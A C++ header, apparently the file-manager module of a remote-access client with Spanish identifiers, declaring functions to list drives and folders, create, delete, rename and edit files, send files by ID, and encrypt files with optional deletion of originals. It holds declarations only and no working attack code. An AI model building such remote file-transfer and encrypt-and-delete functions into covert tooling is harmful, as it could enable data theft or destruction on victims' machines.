#ifdef __MOD_FM

#ifndef ___FM
#define ___FM
#include "headers.hpp"
#include "cliente.hpp"

struct sDrives {
	char cLetter[10];
	char cLabel[50];
	int iDriveType;
	char cType[20];
	double dFree;
	double dTotal;
};

std::vector<struct sDrives> Drives();
std::string strDrivesData();
std::vector<std::string> vDir(c_char* cPath);
void CrearFolder(c_char* cPath);
void CrearArchivo(c_char* cPath);
void BorrarArchivo(c_char* cPath);
void BorrarFolder(c_char* cPath);
void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre);
void EditarArchivo_Guardar(std::string strPath, c_char* cBuffer, std::streamsize iBufferSize);
void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit);
void Crypt_Archivo(const std::string strPath, const char cCryptOption, const char cDelOption, const std::string strPass);
#endif

#endif